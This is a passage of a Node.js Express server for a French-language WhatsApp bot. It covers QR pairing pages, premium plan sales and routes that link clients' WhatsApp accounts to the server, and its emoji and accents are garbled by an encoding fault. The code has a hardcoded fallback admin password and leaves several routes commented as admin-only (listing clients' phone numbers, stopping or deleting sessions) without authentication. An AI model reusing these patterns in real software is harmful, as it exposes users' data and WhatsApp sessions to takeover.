      border: 5px solid rgba(0,0,0,0.1);
      border-left-color: #2196F3;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    
    .error-box {
      background: rgba(244, 67, 54, 0.2);
      border: 1px solid #f44336;
      border-radius: 12px;
      padding: 20px;
      margin: 15px 0;
      color: #fff;
    }
    
    .qr-expired {
      text-align: center;
      padding: 30px;
    }
    .qr-expired .icon { font-size: 4em; margin-bottom: 10px; }
    .qr-expired p { color: #ff9800; font-size: 1.1em; margin: 10px 0; }
    
    .footer {
      margin-top: 20px;
      color: #666;
      font-size: 0.8em;
    }
    .footer a { color: #9c27b0; text-decoration: none; }
    
    .debug-info {
      background: rgba(0,0,0,0.3);
      border-radius: 8px;
      padding: 10px;
      margin-top: 15px;
      font-size: 0.75em;
      color: #888;
      text-align: left;
    }
    
    @media (max-width: 500px) {
      .container { padding: 20px; }
      .logo { font-size: 2em; }
      h1 { font-size: 1.5em; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">ðŸŒŸ</div>
    <h1>HANI-MD</h1>
    <p class="subtitle">Bot WhatsApp Intelligent par H2025</p>
    
    <div id="status-container">
      <div class="status disconnected" id="status-badge">â³ Chargement...</div>
    </div>
    
    <div id="countdown-container" style="display:none;">
      <div class="countdown-text" id="countdown-text">â±ï¸ 60 secondes restantes</div>
      <div class="countdown-bar" id="countdown-bar" style="width: 100%"></div>
    </div>
    
    <div class="qr-container" id="qr-container">
      <div class="loader"></div>
    </div>
    
    <div id="buttons-container">
      <button class="refresh-btn" id="refresh-btn" onclick="forceRefresh()">ðŸ”„ Nouveau QR Code</button>
    </div>
    
    <div id="instructions" class="instructions">
      <h3>ðŸ“± Comment scanner :</h3>
      <ol>
        <li>Ouvre <strong>WhatsApp</strong> sur ton tÃ©lÃ©phone</li>
        <li>Menu <strong>â‹®</strong> â†’ <strong>Appareils connectÃ©s</strong></li>
        <li>Clique <strong>"Connecter un appareil"</strong></li>
        <li><strong>Scanne rapidement</strong> le QR code (60s max)</li>
      </ol>
    </div>
    
    <div id="bot-info" class="bot-info" style="display:none;">
      <h3>ðŸŽ‰ ConnectÃ© avec succÃ¨s!</h3>
      <p id="bot-name">ðŸ¤– Chargement...</p>
      <p id="bot-number">ðŸ“± Chargement...</p>
      <p style="margin-top:15px;font-size:0.9em;color:#8BC34A;">Le bot est maintenant actif!</p>
    </div>
    
    <div class="debug-info" id="debug-info">
      <strong>Debug:</strong> <span id="debug-status">Initialisation...</span><br>
      <strong>QR Count:</strong> <span id="debug-qr-count">0</span> | 
      <strong>Last Update:</strong> <span id="debug-last-update">-</span>
    </div>
    
    <div class="footer">
      <p>CrÃ©Ã© avec â¤ï¸ par <a href="#">H2025</a></p>
      <p><a href="/">â† Retour</a> | <a href="/admin">ðŸ” Admin</a></p>
    </div>
  </div>

  <script>
    let lastQrCount = 0;
    let qrStartTime = null;
    let countdownInterval = null;
    const QR_TIMEOUT = 60; // 60 secondes
    
    function startCountdown() {
      qrStartTime = Date.now();
      document.getElementById('countdown-container').style.display = 'block';
      
      if (countdownInterval) clearInterval(countdownInterval);
      
      countdownInterval = setInterval(() => {
        if (!qrStartTime) return;
        
        const elapsed = Math.floor((Date.now() - qrStartTime) / 1000);
        const remaining = Math.max(0, QR_TIMEOUT - elapsed);
        const percent = (remaining / QR_TIMEOUT) * 100;
        
        const bar = document.getElementById('countdown-bar');
        const text = document.getElementById('countdown-text');
        
        bar.style.width = percent + '%';
        
        if (remaining <= 10) {
          bar.className = 'countdown-bar danger';
          text.className = 'countdown-text danger';
          text.textContent = 'âš ï¸ ' + remaining + 's - SCANNE VITE!';
        } else if (remaining <= 20) {
          bar.className = 'countdown-bar warning';
          text.className = 'countdown-text warning';
          text.textContent = 'â±ï¸ ' + remaining + ' secondes restantes';
        } else {
          bar.className = 'countdown-bar';
          text.className = 'countdown-text';
          text.textContent = 'â±ï¸ ' + remaining + ' secondes restantes';
        }
        
        if (remaining <= 0) {
          showExpired();
        }
      }, 1000);
    }
    
    function stopCountdown() {
      if (countdownInterval) {
        clearInterval(countdownInterval);
        countdownInterval = null;
      }
      qrStartTime = null;
      document.getElementById('countdown-container').style.display = 'none';
    }
    
    function showExpired() {
      stopCountdown();
      document.getElementById('qr-container').innerHTML = '<div class="qr-expired"><div class="icon">â°</div><p><strong>QR Code expirÃ©!</strong></p><p>Clique sur le bouton pour en gÃ©nÃ©rer un nouveau</p></div>';
      document.getElementById('status-badge').textContent = 'â° QR ExpirÃ©';
      document.getElementById('status-badge').className = 'status disconnected';
    }
    
    async function forceRefresh() {
      const btn = document.getElementById('refresh-btn');
      btn.disabled = true;
      btn.textContent = 'â³ Chargement...';
      
      // Recharger la page pour forcer un nouveau QR
      window.location.reload();
    }
    
    async function updateQR() {
      try {
        const response = await fetch('/api/qr-status');
        const data = await response.json();
        
        // Debug info
        document.getElementById('debug-status').textContent = data.status;
        document.getElementById('debug-qr-count').textContent = data.qrCount || 0;
        document.getElementById('debug-last-update').textContent = data.lastUpdate ? new Date(data.lastUpdate).toLocaleTimeString() : '-';
        
        const statusBadge = document.getElementById('status-badge');
        const qrContainer = document.getElementById('qr-container');
        const instructions = document.getElementById('instructions');
        const botInfo = document.getElementById('bot-info');
        const refreshBtn = document.getElementById('refresh-btn');
        
        if (data.status === 'connected' || data.isConnected) {
          // CONNECTÃ‰ !
          stopCountdown();
          statusBadge.textContent = 'âœ… ConnectÃ©';
          statusBadge.className = 'status connected';
          qrContainer.innerHTML = '<div style="text-align:center;color:#4CAF50;font-size:5em;">âœ“</div>';
          instructions.style.display = 'none';
          botInfo.style.display = 'block';
          refreshBtn.style.display = 'none';
          
          if (data.botInfo) {
            document.getElementById('bot-name').textContent = 'ðŸ¤– ' + (data.botInfo.name || 'HANI-MD');
            document.getElementById('bot-number').textContent = 'ðŸ“± ' + (data.botInfo.number || 'ConnectÃ©');
          }
          
        } else if (data.hasQR && data.qrDataURL) {
          // QR CODE DISPONIBLE
          statusBadge.textContent = 'ðŸ“± Scanne le QR Code!';
          statusBadge.className = 'status waiting_qr';
          
          // Nouveau QR code?
          if (data.qrCount !== lastQrCount) {
            lastQrCount = data.qrCount;
            qrContainer.innerHTML = '<img src="' + data.qrDataURL + '" alt="QR Code" />';
            startCountdown();
          }
          
          instructions.style.display = 'block';
          botInfo.style.display = 'none';
          refreshBtn.style.display = 'inline-block';
          refreshBtn.disabled = false;
          refreshBtn.textContent = 'ðŸ”„ Nouveau QR Code';
          
        } else if (data.status === 'connecting') {
          // CONNEXION EN COURS
          stopCountdown();
          statusBadge.textContent = 'ðŸ”„ Connexion en cours...';
          statusBadge.className = 'status connecting';
          qrContainer.innerHTML = '<div class="loader"></div><p style="color:#333;margin-top:15px;">VÃ©rification...</p>';
          refreshBtn.disabled = true;
          
        } else {
          // EN ATTENTE
          statusBadge.textContent = 'â³ En attente du QR...';
          statusBadge.className = 'status waiting';
          qrContainer.innerHTML = '<div class="loader"></div><p style="color:#333;margin-top:15px;">GÃ©nÃ©ration du QR code...</p>';
          refreshBtn.disabled = false;
        }
        
      } catch (error) {
        console.error('Erreur:', error);
        document.getElementById('debug-status').textContent = 'Erreur: ' + error.message;
      }
    }
    
    // PremiÃ¨re mise Ã  jour immÃ©diate
    updateQR();
    
    // Actualisation toutes les 2 secondes
    setInterval(updateQR, 2000);
  </script>
</body>
</html>
  `);
});

// Page d'accueil mise Ã  jour
app.get("/", (req, res) => {
  const uptime = formatUptime(Date.now() - db.data.stats.startTime);
  const statusColor = qrState.isConnected ? "#4CAF50" : "#ff9800";
  const statusText = qrState.isConnected ? "âœ… ConnectÃ©" : "â³ En attente de connexion";
  
  res.send(`
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>HANI-MD - Dashboard</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .container {
      background: rgba(255,255,255,0.1);
      backdrop-filter: blur(10px);
      border-radius: 24px;
      padding: 40px;
      max-width: 500px;
      width: 100%;
      text-align: center;
      box-shadow: 0 8px 32px rgba(0,0,0,0.3);
    }
    h1 { color: #fff; font-size: 2.5em; margin-bottom: 10px; }
    .status {
      display: inline-block;
      padding: 10px 20px;
      border-radius: 50px;
      font-weight: bold;
      margin: 15px 0;
      background: ${statusColor};
      color: ${qrState.isConnected ? '#fff' : '#000'};
    }
    .stats {
      background: rgba(255,255,255,0.05);
      border-radius: 12px;
      padding: 20px;
      margin: 20px 0;
    }
    .stat-item {
      display: flex;
      justify-content: space-between;
      padding: 10px 0;
      border-bottom: 1px solid rgba(255,255,255,0.1);
      color: #fff;
    }
    .stat-item:last-child { border: none; }
    .stat-value { color: #4CAF50; font-weight: bold; }
    .btn {
      display: inline-block;
      padding: 15px 30px;
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: #fff;
      text-decoration: none;
      border-radius: 50px;
      font-weight: bold;
      margin: 10px;
      transition: transform 0.3s;
    }
    .btn:hover { transform: scale(1.05); }
    .btn.secondary { background: rgba(255,255,255,0.1); }
    .footer { color: #666; margin-top: 30px; font-size: 0.9em; }
  </style>
</head>
<body>
  <div class="container">
    <h1>ðŸŒŸ HANI-MD</h1>
    <p style="color:#aaa;">Bot WhatsApp Intelligent par H2025</p>
    
    <div class="status">${statusText}</div>
    
    <div class="stats">
      <div class="stat-item">
        <span>â±ï¸ Uptime</span>
        <span class="stat-value">${uptime}</span>
      </div>
      <div class="stat-item">
        <span>ðŸ“¨ Commandes</span>
        <span class="stat-value">${db.data.stats.commands}</span>
      </div>
      <div class="stat-item">
        <span>ðŸ‘¥ Utilisateurs</span>
        <span class="stat-value">${Object.keys(db.data.users).length}</span>
      </div>
      <div class="stat-item">
        <span>ðŸ˜ï¸ Groupes</span>
        <span class="stat-value">${Object.keys(db.data.groups).length}</span>
      </div>
      <div class="stat-item">
        <span>ðŸŒ Mode</span>
        <span class="stat-value">${config.MODE}</span>
      </div>
    </div>
    
    <a href="/qr" class="btn">ðŸ“± Scanner QR Code</a>
    <a href="/health" class="btn secondary">ðŸ” Health Check</a>
    
    <div class="footer">
      <p>Version 1.0 | <a href="https://github.com/itestmypartner/HANI" style="color:#9c27b0;">GitHub</a></p>
    </div>
  </div>
</body>
</html>
  `);
});

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸ’Ž ROUTES PREMIUM WEB
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const crypto = require("crypto");
const premiumAdminSessions = new Map();
const PREMIUM_ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "hani2025";

// Servir les fichiers statiques du dashboard premium
const premiumPublicPath = path.join(__dirname, "web", "public");
if (fs.existsSync(premiumPublicPath)) {
  app.use("/premium", express.static(premiumPublicPath));
}

// Middleware d'auth premium admin
function requirePremiumAdmin(req, res, next) {
  const token = req.headers.authorization?.replace("Bearer ", "") || req.query.token;
  if (!token || !premiumAdminSessions.has(token)) {
    return res.status(401).json({ error: "Non autorisÃ©" });
  }
  const session = premiumAdminSessions.get(token);
  if (Date.now() > session.expires) {
    premiumAdminSessions.delete(token);
    return res.status(401).json({ error: "Session expirÃ©e" });
  }
  next();
}

// Auth premium admin
app.post("/api/admin/login", (req, res) => {
  const { password } = req.body;
  if (password === PREMIUM_ADMIN_PASSWORD) {
    const token = crypto.randomBytes(32).toString("hex");
    premiumAdminSessions.set(token, { expires: Date.now() + 24 * 60 * 60 * 1000 });
    console.log(`[PREMIUM-WEB] ðŸ”“ Connexion admin premium`);
    res.json({ success: true, token });
  } else {
    res.status(401).json({ error: "Mot de passe incorrect" });
  }
});

// Stats premium
app.get("/api/admin/stats", requirePremiumAdmin, (req, res) => {
  try {
    const stats = premiumDB.getStats();
    const users = premiumDB.getAllPremiumUsers();
    const codes = premiumDB.getUnusedCodes();
    const prices = { BRONZE: 500, ARGENT: 1000, OR: 2000, DIAMANT: 5000, LIFETIME: 15000 };
    let revenue = 0;
    for (const [plan, count] of Object.entries(stats.byPlan || {})) {
      revenue += (count || 0) * (prices[plan] || 0);
    }
    res.json({ success: true, stats: { ...stats, revenue, activeUsers: users.length, availableCodes: codes.length } });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Users premium API
app.get("/api/admin/users", requirePremiumAdmin, (req, res) => {
  try {
    res.json({ success: true, users: premiumDB.getAllPremiumUsers() });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post("/api/admin/users", requirePremiumAdmin, (req, res) => {
  try {
    const { phone, plan, days } = req.body;
    if (!phone || !plan) return res.status(400).json({ error: "NumÃ©ro et plan requis" });
    const jid = phone.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    res.json(premiumDB.addPremium(jid, plan.toUpperCase(), days || 30));
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.delete("/api/admin/users/:phone", requirePremiumAdmin, (req, res) => {
  try {
    const jid = req.params.phone.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    res.json(premiumDB.removePremium(jid));
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Codes premium API
app.get("/api/admin/codes", requirePremiumAdmin, (req, res) => {
  try {
    res.json({ success: true, codes: premiumDB.getUnusedCodes() });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post("/api/admin/codes/generate", requirePremiumAdmin, (req, res) => {
  try {
    const { plan, count } = req.body;
    if (!plan) return res.status(400).json({ error: "Plan requis" });
    const codes = [];
    for (let i = 0; i < Math.min(count || 1, 50); i++) {
      const result = premiumDB.generateCode(plan.toUpperCase());
      if (result.success) codes.push(result.code);
    }
    res.json({ success: true, codes, count: codes.length });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// API Publique Premium - Chargement depuis la config
const premiumConfigPath = path.join(__dirname, "DataBase", "premium_config.json");
let premiumConfig = {};
try {
  if (fs.existsSync(premiumConfigPath)) {
    premiumConfig = JSON.parse(fs.readFileSync(premiumConfigPath, "utf8"));
  }
} catch (e) { console.log("[PREMIUM] Erreur config:", e.message); }

// Endpoint principal des plans (utilise la config)
app.get("/api/plans", (req, res) => {
  try {
    const config = fs.existsSync(premiumConfigPath) 
      ? JSON.parse(fs.readFileSync(premiumConfigPath, "utf8")) 
      : premiumConfig;
    
    const plans = Object.entries(config.plans || {}).map(([id, plan]) => ({
      id,
      name: plan.name,
      price: plan.price,
      currency: plan.currency,
      duration: plan.duration,
      dailyLimit: plan.dailyLimit,
      icon: plan.icon,
      color: plan.color,
      popular: plan.popular,
      features: plan.features,
      commands: plan.commands
    }));
    
    res.json({
      success: true,
      botInfo: config.botInfo,
      plans,
      paymentMethods: config.paymentMethods,
      categories: config.categories
    });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Endpoint des fonctionnalitÃ©s par catÃ©gorie
app.get("/api/features", (req, res) => {
  try {
    const config = fs.existsSync(premiumConfigPath) 
      ? JSON.parse(fs.readFileSync(premiumConfigPath, "utf8")) 
      : premiumConfig;
    
    res.json({
      success: true,
      categories: config.categories,
      botInfo: config.botInfo
    });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Endpoint du bot info
app.get("/api/bot", (req, res) => {
  try {
    const config = fs.existsSync(premiumConfigPath) 
      ? JSON.parse(fs.readFileSync(premiumConfigPath, "utf8")) 
      : premiumConfig;
    
    res.json({
      success: true,
      ...config.botInfo,
      connected: true,
      uptime: process.uptime()
    });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get("/api/status/:phone", (req, res) => {
  try {
    const jid = req.params.phone.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const info = premiumDB.getPremiumInfo(jid);
    res.json({ success: true, phone: req.params.phone, ...info });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post("/api/activate", (req, res) => {
  try {
    const { code, phone } = req.body;
    if (!code || !phone) return res.status(400).json({ error: "Code et numÃ©ro requis" });
    const jid = phone.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    res.json(premiumDB.redeemCode(code.toUpperCase(), jid));
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post("/api/subscribe", (req, res) => {
  try {
    const { phone, plan, paymentMethod } = req.body;
    if (!phone || !plan) return res.status(400).json({ error: "NumÃ©ro et plan requis" });
    
    const requestsFile = path.join(__dirname, "DataBase", "premium_requests.json");
    let requests = [];
    if (fs.existsSync(requestsFile)) {
      try { requests = JSON.parse(fs.readFileSync(requestsFile, "utf8")); } catch (e) {}
    }
    
    const request = {
      id: crypto.randomBytes(8).toString("hex"),
      phone: phone.replace(/[^0-9]/g, ""),
      plan: plan.toUpperCase(),
      paymentMethod,
      status: "pending",
      createdAt: new Date().toISOString()
    };
    requests.push(request);
    fs.writeFileSync(requestsFile, JSON.stringify(requests, null, 2));
    
    res.json({
      success: true,
      message: "Demande enregistrÃ©e!",
      requestId: request.id,
      paymentInfo: { number: "+22550252467", amount: { BRONZE: 500, ARGENT: 1000, OR: 2000, DIAMANT: 5000, LIFETIME: 15000 }[plan.toUpperCase()] }
    });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get("/api/admin/requests", requirePremiumAdmin, (req, res) => {
  try {
    const requestsFile = path.join(__dirname, "DataBase", "premium_requests.json");
    let requests = [];
    if (fs.existsSync(requestsFile)) {
      try { requests = JSON.parse(fs.readFileSync(requestsFile, "utf8")); } catch (e) {}
    }
    res.json({ success: true, requests });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post("/api/admin/requests/:id/approve", requirePremiumAdmin, (req, res) => {
  try {
    const requestsFile = path.join(__dirname, "DataBase", "premium_requests.json");
    let requests = [];
    if (fs.existsSync(requestsFile)) {
      try { requests = JSON.parse(fs.readFileSync(requestsFile, "utf8")); } catch (e) {}
    }
    
    const request = requests.find(r => r.id === req.params.id);
    if (!request) return res.status(404).json({ error: "Demande non trouvÃ©e" });
    
    const codeResult = premiumDB.generateCode(request.plan);
    if (!codeResult.success) return res.status(500).json({ error: "Erreur gÃ©nÃ©ration code" });
    
    const jid = request.phone + "@s.whatsapp.net";
    premiumDB.redeemCode(codeResult.code, jid);
    
    request.status = "approved";
    request.approvedAt = new Date().toISOString();
    request.code = codeResult.code;
    fs.writeFileSync(requestsFile, JSON.stringify(requests, null, 2));
    
    res.json({ success: true, message: "Demande approuvÃ©e", code: codeResult.code, phone: request.phone });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸ”— ROUTES MULTI-SESSION (Bots clients)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

let multiSession;
try {
  multiSession = require('./lib/MultiSession');
  console.log("[MULTI-SESSION] ðŸ“± Module chargÃ©");
} catch (e) {
  console.log("[MULTI-SESSION] âš ï¸ Module non disponible:", e.message);
}

// Route pour la page de connexion client
app.get('/premium/connect/:clientId', (req, res) => {
  res.sendFile(path.join(__dirname, 'web', 'public', 'connect.html'));
});

// API: Obtenir le statut d'un client
app.get('/api/premium/status/:clientId', (req, res) => {
  try {
    if (!multiSession) {
      return res.status(500).json({ error: "Multi-session non disponible" });
    }
    
    const clientInfo = multiSession.getClientInfo(req.params.clientId);
    if (!clientInfo) {
      return res.status(404).json({ error: "Client non trouvÃ©" });
    }
    
    res.json({
      clientId: clientInfo.clientId,
      status: clientInfo.status,
      plan: clientInfo.plan,
      phoneNumber: clientInfo.phoneNumber,
      expiresAt: clientInfo.expiresAt,
      createdAt: clientInfo.createdAt
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// API: DÃ©marrer la connexion pour un client
app.post('/api/premium/start/:clientId', async (req, res) => {
  try {
    if (!multiSession) {
      return res.status(500).json({ error: "Multi-session non disponible" });
    }
    
    const clientInfo = multiSession.getClientInfo(req.params.clientId);
    if (!clientInfo) {
      return res.status(404).json({ error: "Client non trouvÃ©" });
    }
    
    // VÃ©rifier expiration
    if (clientInfo.expiresAt && new Date(clientInfo.expiresAt) < new Date()) {
      return res.status(403).json({ error: "Abonnement expirÃ©" });
    }
    
    // Si dÃ©jÃ  connectÃ©, retourner le statut
    if (clientInfo.status === 'connected' && multiSession.activeSessions.has(req.params.clientId)) {
      return res.json({ status: 'connected', phoneNumber: clientInfo.phoneNumber });
    }
    
    // DÃ©marrer la connexion
    multiSession.startClientConnection(
      req.params.clientId,
      (qr, id) => console.log(`[MULTI-SESSION] QR prÃªt pour ${id}`),
      (sock, id, phone) => console.log(`[MULTI-SESSION] Client ${id} connectÃ©: ${phone}`),
      (id, shouldReconnect) => console.log(`[MULTI-SESSION] Client ${id} dÃ©connectÃ©`)
    ).catch(e => console.error(`[MULTI-SESSION] Erreur:`, e.message));
    
    res.json({ status: 'starting', message: 'Connexion en cours...' });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// API: Obtenir le QR code
app.get('/api/premium/qr/:clientId', (req, res) => {
  try {
    if (!multiSession) {
      return res.status(500).json({ error: "Multi-session non disponible" });
    }
    
    const clientInfo = multiSession.getClientInfo(req.params.clientId);
    if (!clientInfo) {
      return res.status(404).json({ error: "Client non trouvÃ©" });
    }
    
    // Si connectÃ©
    if (clientInfo.status === 'connected') {
      return res.json({ status: 'connected', phoneNumber: clientInfo.phoneNumber, plan: clientInfo.plan });
    }
    
    // RÃ©cupÃ©rer le QR
    const qr = multiSession.getPendingQR(req.params.clientId);
    if (qr) {
      return res.json({ qr, status: 'pending' });
    }
    
    res.json({ status: 'waiting', message: 'QR en prÃ©paration...' });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// API: Liste des clients (admin)
app.get('/api/premium/clients', (req, res) => {
  try {
    if (!multiSession) {
      return res.status(500).json({ error: "Multi-session non disponible" });
    }
    
    const clients = multiSession.listAllClients();
    const active = multiSession.getActiveClients();
    
    res.json({
      total: Object.keys(clients).length,
      active: active.length,
      clients: Object.values(clients).map(c => ({
        clientId: c.clientId,
        status: c.status,
        plan: c.plan,
        phoneNumber: c.phoneNumber,
        expiresAt: c.expiresAt,
        isActive: active.includes(c.clientId)
      }))
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// API: ArrÃªter une session client (admin)
app.post('/api/premium/stop/:clientId', async (req, res) => {
  try {
    if (!multiSession) {
      return res.status(500).json({ error: "Multi-session non disponible" });
    }
    
    await multiSession.stopClientSession(req.params.clientId);
    res.json({ success: true, message: "Session arrÃªtÃ©e" });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// API: Supprimer une session client (admin)
app.delete('/api/premium/client/:clientId', async (req, res) => {
  try {
    if (!multiSession) {
      return res.status(500).json({ error: "Multi-session non disponible" });
    }
    
    await multiSession.deleteClientSession(req.params.clientId);
    res.json({ success: true, message: "Client supprimÃ©" });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸ†• NOUVELLES ROUTES - INSCRIPTION CLIENTS COMPLÃˆTE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// API: Inscription d'un nouveau client (aprÃ¨s paiement)
app.post('/api/clients/register', async (req, res) => {
  try {
    const { phone, plan, email, name, transactionId } = req.body;
    
    if (!phone || !plan) {
      return res.status(400).json({ error: "NumÃ©ro de tÃ©lÃ©phone et plan requis" });
    }
    
    // Valider le plan
    const validPlans = ['bronze', 'argent', 'or', 'diamant', 'lifetime'];
    if (!validPlans.includes(plan.toLowerCase())) {
      return res.status(400).json({ error: "Plan invalide" });
    }
    
    // VÃ©rifier si MultiSession est disponible
    if (!multiSession) {
      return res.status(500).json({ error: "SystÃ¨me multi-session non disponible" });
    }
    
    // DurÃ©es selon le plan
    const planDurations = { bronze: 30, argent: 30, or: 30, diamant: 30, lifetime: -1 };
    const days = planDurations[plan.toLowerCase()];
    
    // CrÃ©er le client via MultiSession
    const result = multiSession.createClientSession 
      ? await multiSession.createClientSession(transactionId || 'DIRECT', plan.toUpperCase(), 
          days === -1 ? null : new Date(Date.now() + days * 24 * 60 * 60 * 1000).toISOString())
      : { clientId: 'CLI_' + Date.now().toString(36).toUpperCase(), status: 'pending' };
    
    // Enregistrer dans le systÃ¨me de demandes
    const requestsFile = path.join(__dirname, "DataBase", "client_registrations.json");
    let registrations = [];
    if (fs.existsSync(requestsFile)) {
      try { registrations = JSON.parse(fs.readFileSync(requestsFile, "utf8")); } catch (e) {}
    }
    
    const registration = {
      id: result.clientId,
      phone: phone.replace(/[^0-9]/g, ''),
      email: email || null,
      name: name || `Client ${result.clientId}`,
      plan: plan.toUpperCase(),
      transactionId: transactionId || null,
      status: 'pending',
      createdAt: new Date().toISOString(),
      expiresAt: days === -1 ? null : new Date(Date.now() + days * 24 * 60 * 60 * 1000).toISOString()
    };
    
    registrations.push(registration);
    fs.writeFileSync(requestsFile, JSON.stringify(registrations, null, 2));
    
    console.log(`[CLIENT] ðŸ“ Nouveau client inscrit: ${result.clientId} (${plan})`);
    
    res.json({
      success: true,
      clientId: result.clientId,
      plan: plan.toUpperCase(),
      connectUrl: `/connect.html?id=${result.clientId}`,
      message: "Inscription rÃ©ussie! Scannez le QR code pour connecter votre WhatsApp."
    });
  } catch (e) {
    console.error('[CLIENT] âŒ Erreur inscription:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// API: VÃ©rifier un ID client
app.get('/api/clients/verify/:clientId', (req, res) => {
  try {
    const clientId = req.params.clientId;
    
    if (multiSession && multiSession.getClientInfo) {
      const client = multiSession.getClientInfo(clientId);
      if (client) {
        return res.json({
          valid: true,
          clientId: client.clientId,
          plan: client.plan,
          status: client.status,
          expiresAt: client.expiresAt
        });
      }
    }
    
    // Chercher dans les enregistrements
    const requestsFile = path.join(__dirname, "DataBase", "client_registrations.json");
    if (fs.existsSync(requestsFile)) {
      const registrations = JSON.parse(fs.readFileSync(requestsFile, "utf8"));
      const reg = registrations.find(r => r.id === clientId);
      if (reg) {
        return res.json({
          valid: true,
          clientId: reg.id,
          plan: reg.plan,
          status: reg.status,
          expiresAt: reg.expiresAt
        });
      }
    }
    
    res.json({ valid: false, error: "Client non trouvÃ©" });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// API: Initier la connexion WhatsApp pour un client
app.post('/api/clients/connect/:clientId', async (req, res) => {
  try {
    const clientId = req.params.clientId;
    
    if (!multiSession) {
      return res.status(500).json({ error: "Multi-session non disponible" });
    }
    
    // VÃ©rifier le client
    const client = multiSession.getClientInfo(clientId);
    if (!client) {
      return res.status(404).json({ error: "Client non trouvÃ©. Veuillez d'abord vous inscrire." });
    }
    
    // VÃ©rifier expiration
    if (client.expiresAt && new Date(client.expiresAt) < new Date()) {
      return res.status(403).json({ error: "Votre abonnement a expirÃ©. Veuillez renouveler." });
    }
    
    // Si dÃ©jÃ  connectÃ©
    if (client.status === 'connected' && multiSession.activeSessions?.has(clientId)) {
      return res.json({ 
        status: 'connected', 
        phoneNumber: client.phoneNumber,
        plan: client.plan
      });
    }
    
    // DÃ©marrer la connexion
    await multiSession.startClientConnection(
      clientId,
      (qr, id) => console.log(`[CLIENT] ðŸ“± QR prÃªt pour ${id}`),
      (sock, id, phone) => console.log(`[CLIENT] âœ… ${id} connectÃ©: ${phone}`),
      (id, shouldReconnect) => console.log(`[CLIENT] ðŸ”´ ${id} dÃ©connectÃ©`)
    );
    
    res.json({ status: 'connecting', message: 'Connexion en cours... Le QR code sera bientÃ´t disponible.' });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// API: Obtenir le QR code pour un client
app.get('/api/clients/qr/:clientId', async (req, res) => {
  try {
    const clientId = req.params.clientId;
    
    if (!multiSession) {
      return res.status(500).json({ error: "Multi-session non disponible" });
    }
    
    const client = multiSession.getClientInfo(clientId);
    if (!client) {
      return res.status(404).json({ error: "Client non trouvÃ©" });
    }
    
    // Si connectÃ©
    if (client.status === 'connected') {
      return res.json({ 
        status: 'connected', 
        phoneNumber: client.phoneNumber,
        plan: client.plan,
        message: "Votre bot est dÃ©jÃ  connectÃ©!"
      });
    }
    
    // RÃ©cupÃ©rer le QR
    const qr = multiSession.getPendingQR(clientId);
    if (qr) {
      return res.json({ status: 'pending', qr });
    }
    
    res.json({ status: 'waiting', message: 'QR code en prÃ©paration...' });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// API: Obtenir les plans disponibles
app.get('/api/plans', (req, res) => {
  const plans = {
    bronze: { name: "Bronze", price: 500, duration: 30, dailyLimit: 100, currency: "FCFA" },
